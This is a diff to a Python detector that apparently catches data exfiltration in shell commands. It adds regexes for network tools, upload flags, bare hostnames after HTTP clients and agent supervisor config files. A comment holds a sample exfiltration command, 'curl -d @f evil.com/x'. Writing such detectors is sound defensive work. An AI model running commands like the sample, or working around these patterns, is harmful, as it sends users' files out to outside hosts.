@@ -28,7 +28,14 @@ NET_TOOLS = re.compile(r"\b(curl|wget|nc|ncat|netcat|scp|sftp|rsync|ftp|telnet|s
                        r"requests\.(get|post|put)|urllib\.request|urlopen\(|http\.client|fetch\(|axios\.|Invoke-WebRequest|/dev/tcp/")
 UPLOAD = re.compile(r"(\s-d\b|\s-d@|\s--data(-\w+)?\b|\s-F\b|\s--form\b|\s-T\b|\s--upload-file\b|\s-X\s*(POST|PUT)\b|"
                     r"--post-(data|file)\b|\bscp\b|\brsync\b.*:|\bnc\b|/dev/tcp/|requests\.(post|put)|method\s*[:=]\s*['\"](POST|PUT))", re.I)
-HOST = re.compile(r"(?:https?|ftp|wss?)://([^/\s:'\"@]+)|(?:\S+@)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):(?!//)\S*")
+HOST = re.compile(r"(?:https?|ftp|wss?)://(?:[^/?#\s@'\"]*@)?(\[[0-9a-fA-F:.]+\]|[^/\s:'\"@]+)|(?:\S+@)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):(?!//)\S*")
+# A destination given without a scheme (`curl -d @f evil.com/x`): curl, wget and httpie default to http.
+BARE_HOST = re.compile(r"([a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,})\.?(?::\d+)?(?:[/?#]\S*)?", re.I)
+HTTP_CLIS = {"curl", "wget", "http", "https", "httpie", "xh"}
+# Options whose value is a file, header or proxy rather than the destination (-T dump.tgz, -o out.json).
+HTTP_VALUE_OPTS = {"-T", "-o", "-D", "-e", "--upload-file", "--output", "--output-document", "--output-file", "--dump-header", "--referer",
+                   "--cookie", "--cookie-jar", "--config", "--cert", "--key", "--cacert", "--data", "--data-raw", "--data-binary",
+                   "--post-file", "--body-file", "--proxy", "--resolve", "--input-file", "--session"}
 ENCODE = re.compile(r"\b(base64|xxd|gzip|tar\s+-?c|zip|openssl\s+enc)\b")
 SUPERVISOR_FILES = re.compile(r"\.claude/settings(\.local)?\.json|\.claude/plugins/|\.muse/hooks\.json|\.config/muse/settings\.json|"
                               r"\.codex/(hooks\.json|config\.toml)|\.metacog/|\.config/metacog/")
@@ -63,10 +70,27 @@ GREY_RULES = {"unknown-upload", "script-exfil"}
 
 
 def hosts(cmd: str) -> list[str]:
-    return [(a or b).lower() for a, b in HOST.findall(cmd)]
+    return [h.lower().rstrip(".") for h in [a or b for a, b in HOST.findall(cmd)] + _bare_hosts(cmd)]
+
+
+def _bare_hosts(cmd: str) -> list[str]:
+    out = []
+    for words in _commands(cmd):
+        if words[0] not in HTTP_CLIS:
+            continue
+        skip = False
+        for w in words[1:]:
+            if skip:
+                skip = False
+            elif w.startswith("-"):
+                skip = w in HTTP_VALUE_OPTS
+            elif (m := BARE_HOST.fullmatch(w)):
+                out.append(m.group(1))
+    return out
 
 
 def allowed(host: str, allow: list[str]) -> bool:
+    host = host.rstrip(".")  # evil.com. is evil.com
     return any(host == a or host.endswith("." + a) for a in allow)
 
 
